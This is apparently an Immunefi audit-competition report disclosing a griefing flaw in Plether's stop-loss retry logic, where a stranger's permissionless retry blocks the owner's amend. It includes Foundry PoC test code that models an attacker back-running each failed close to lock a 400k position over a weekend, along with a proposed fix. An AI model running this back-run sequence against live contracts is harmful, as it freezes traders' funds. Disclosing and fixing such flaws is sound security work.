# \#99641 [SC-High] Permissionless protection retry pre-empts the owner's amend of a Latched stop-loss, freezing the position and its margin through the weekend

**Submitted on Nov 14th 2026 at 15:52:40 UTC by @arcomus for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99641
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

Any address with only gas and no role can keep a trader stuck in a position whose stop-loss close failed on her own limits. Her documented way out is `amendLatchedPositionProtectionCloseLimits` after the relatch, but anyone can call `retryPositionProtectionClose` first, re-queueing the failing close so the amend reverts. In the PoC at release parameters, retrying after every failure kept a 400k position and 17,076.42 USDG locked through the oracle-frozen weekend (172,794 s) against an owner sending one transaction at a time.

## Vulnerability Details

Each protection stores four close ceilings the owner must set explicitly (CANONICAL_ENTRYPOINTS.md:121-126). When its close order (the child) fails terminally and the position hasn't changed, `handleFailedProtectionAttempt` relatches it to `Latched` (PositionProtectionBook.sol:637-675). Her only way to change the limits that made it fail is `amendLatchedPositionProtectionCloseLimits` (:315-328), which needs `Latched` and no pending order. `retryPositionProtectionClose` (:382-406) needs the same state but has no owner check. It commits a fresh child with the old limits (OrderLiquidationBatchLogic.sol:657-680), adding a pending order to her account, and sets `Triggered` (PositionProtectionBook.sol:573), so the amend reverts `ProtectionNotLatched`. Cancel, replace and cancel-and-close reject `Triggered` (:408-419, :264-277, :341-348) and an ordinary close reverts `ProtectionActive` (OrderLiquidationBatchLogic.sol:313-315). Until the relatch is mined the amend reverts, so her wallet can't estimate it.

```solidity
// PositionProtectionBook.sol:315-325 (abridged): owner only, needs Latched and no pending order
function amendLatchedPositionProtectionCloseLimits(uint64 protectionId, CloseFinancialLimits calldata limits) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionStatus.Latched) revert OrderRouter__ProtectionNotLatched();
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) revert OrderRouter__PendingOrdersExist();

// PositionProtectionBook.sol:382-405 (abridged): any caller, same state, old limits
function retryPositionProtectionClose(uint64 protectionId) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId); // no owner check, no owner grace period
    if (protection.status != PositionProtectionStatus.Latched) revert OrderRouter__ProtectionNotLatched();
    // ... matching position, no pending order, previous attempt terminal
    linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER) // Router commit: owner's pending order count + 1
        .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
    _recordCloseAttempt(protection, linkedOrderId); // status = Triggered
```

The ceilings and the amend came with the fix for Cecuro MED-9 (acknowledged, 8a2853f), whose comment warns tight limits "may prevent execution until conditions improve or the owner amends them", and the interface puts the amend "before a fresh retry" (IPositionProtectionActions.sol:32). A stranger retrying first removes that exit, so the fix is incomplete. Of the listed Known Limitations, SECURITY.md:1345 covers cancelling one's own intents and :1356-1359 unpaid retry cleanup and `Latched` with no live child; here a stranger keeps one live. Scan d4541b49's zero-bounty item covers nobody finishing the close.

## Impact Details

This needs a close ceiling every attempt breaks and, for the weekend, a child queued or the protection `Latched` at Friday's 21:00 UTC freeze. Frozen children would owe the 50 bp spread plus 4 bp fee, so any fee ceiling under 54 bp (2,160 on 400k) fails each one and nothing is charged.

The main test gives ALICE's 400k LONG a stop-loss with `maxExplicitFeesAssets` at 400 USDG (10 bp, enough for live closes), triggered 30 s pre-freeze. Left alone, she amends, retries and withdraws 37,076.02 that night. With a stranger, MALLORY, back-running each terminalization from the sequencer feed (ordering is modeled; an owner bot would race it), the PoC measured a 172,794 s lock at release parameters (asserted >= 24 h): 47 hourly amends reverted and the 17,076.42 USDG her close would free stayed locked until the reopen. A live weekday variant held 3,720 s on a gross-debit ceiling.

An atomic batch (smart account or EIP-7702, as tested) or a pre-signed pair with a manual gas limit escapes; normal wallets do neither. The page counts feasibility against payout, not severity.

MALLORY pays only gas, 0.61-0.67M per retry (measured), or $0.017-0.027 at 0.67M gas, 0.01 gwei and ETH $2.5-4k (computed, L1 data fee excluded). That's $2.4-3.8 for the PoC's 142 retries, or $580-930 if keepers executed every child about 5 s after commit all weekend. The cost doesn't depend on position size, so the damage-to-cost ratio grows with the amount locked.

## Recommendation

Give the owner a short window after each relatch. `R4-1_fix.diff` (+12 lines, PositionProtectionBook.sol only) stores `latchedAt` and lets only the owner retry for `OWNER_RETRY_GRACE_SECONDS` (10 minutes); her amend ends the window and anyone can retry after it. Patched, MALLORY's first retry reverts `OwnerRetryGrace` and 4 of the 5 PoC tests stop there.

## References

- Amend (owner only, Latched, no pending order): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328
- Retry (any caller): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406
- Retry sets Triggered: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L564-L578
- Router commit adds the owner's pending order: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderCommitHandler.sol#L56
- Relatch on a failed attempt: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637-L675
- Cancel, replace and cancel-and-close guards: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L408-L419 , https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L264-L277 , https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L341-L348
- Ordinary commits blocked (ProtectionActive): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315
- Child copies the stored ceilings: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L657-L680
- Amend and retry NatSpec: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/interfaces/IPositionProtectionActions.sol#L32-L33 , https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/interfaces/IPositionProtectionActions.sol#L70-L78
- Known Limitations, Router and keeper: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1343-L1369
- Every protection must supply its four close ceilings explicitly: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L121-L126
- Owner amends once Latched, before retrying: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WORKING_WITH_AI_AGENTS.md#L284
- Workers told not to keep re-queueing a failing attempt: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L419-L421
- Release parameters: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L128-L156
- Repo test of the intended order, owner amends while Latched and only then a third party retries (her next amend, against that live child, reverts): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/spec/trader/PositionProtection.t.sol#L954-L1005
- Cecuro report, MED-9: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf
- AI scan, "Protection trigger bounty is paid before a zero-bounty close is executed": https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md

## Link to Proof of Concept

https://gist.github.com/antonio-rosendo/f7b99e9c56384a5676d228a237f288c9

## Proof of Concept

## Proof of Concept

Secret gist: https://gist.github.com/antonio-rosendo/f7b99e9c56384a5676d228a237f288c9 (test, `R4-1_fix.diff`, README with expected output). The test inherits only the repo's `BasePerpTest`, asserts the release parameters in `setUp` (pool and router config set through the owner's ordinary 72 h timelock) and mocks only USDG and Pyth.

```
git clone https://github.com/immunefi-team/audit-comp-plether && cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8 && git submodule update --init --recursive
export GIST=/absolute/path/to/this/gist
mkdir -p packages/perps/test/perps/poc/round4 && cp "$GIST"/ProtectionAmendPreemption.t.sol packages/perps/test/perps/poc/round4/
cd packages/perps
FOUNDRY_VIA_IR=false forge test --match-path test/perps/poc/round4/ProtectionAmendPreemption.t.sol -vv
```

Expected: `Suite result: ok. 5 passed; 0 failed; 0 skipped`. Main test log:

```
=== frozen weekend, sequential owner, release params ===
lock held (s)                                     : 172794
owner free settlement, control (closed Fri night) : 37076.02
owner free settlement under attack start/end      : 19999.60 / 19999.60
locked amount vs control (control free - end free): 17076.42
position size (tokens) start/end                  : 400000 / 400000
position margin start/end                         : 19359.99 / 19359.99
settlement balance start/end                      : 39759.59 / 39759.59
owner sequential amend attempts (all reverted)    : 47
owner calls that reverted or were pre-empted      : 286
Mallory retries                                   : 142
Mallory gas each (avg / max, warm test state)     : 664946 / 664946
Mallory USDG balance delta during the lock        : 0.00
Mallory USDG balance delta incl. trigger bounty   : 0.20
```

Key test from `ProtectionAmendPreemption.t.sol`:

```solidity
function test_R4_1_FrozenWeekend_BackRunRetryLocks48h() public {
    uint64 pid = _setupLatchedAtFreeze();

    // Control branch from this exact state: without MALLORY the owner amends, retries and is closed Friday night.
    uint256 snap = vm.snapshotState();
    uint256 freeControl = _ownerAmendRetryClose(pid);
    vm.revertToState(snap);

    LockSnap memory startSnap = _lockSnap();
    // MALLORY back-runs the keeper's terminalization (same block).
    uint64 child = _malloryRetry(pid);
    for (uint256 h = 1; h <= 47; ++h) {
        child = _frozenHour(pid, child, h);
    }

    _warpRoll(UNFREEZE - 1);
    assertTrue(engine.isOracleFrozen(), "end of frozen window");
    _assertOwnerLockedOut(pid);
    LockSnap memory endSnap = _lockSnap();
    _assertLockHeld(startSnap, endSnap, 24 hours);
    assertGt(freeControl, endSnap.free, "control releases more than the attack leaves free");
    _logFrozen(freeControl, startSnap, endSnap);

    // Withdrawing more than the free part fails: the position margin stays locked.
    vm.prank(ALICE);
    vm.expectRevert();
    clearinghouse.withdraw(ALICE, endSnap.free + 1);
}
```

The end of `_frozenHour`, ALICE's hourly attempt:

```solidity
// (b) Any block boundary: Triggered with one live child; every owner action reverts.
_warpRoll(FREEZE + h * 1 hours);
assertTrue(engine.isOracleFrozen(), "still frozen");
_assertOwnerLockedOut(pid);

// (c) Sequential owner flow: tx1 terminalizes the child, MALLORY back-runs, tx2 amend reverts.
vm.prank(ALICE);
rk = router.executeOrder(child, new bytes[](0));
++aliceCalls;
assertEq(uint8(rk.status), uint8(OrderV3Types.LifecycleStatus.Failed), "alice tx1 terminalizes");
assertEq(
    uint8(pViews.getPositionProtection(pid).status),
    uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
    "latched only inside the back-run window"
);
child = _malloryRetry(pid);
_warpRoll(vm.getBlockTimestamp() + 1);
vm.prank(ALICE);
vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
pActions.amendLatchedPositionProtectionCloseLimits(pid, _maxLimits());
++aliceCalls;
++aliceAmendAttempts;
return child;
```
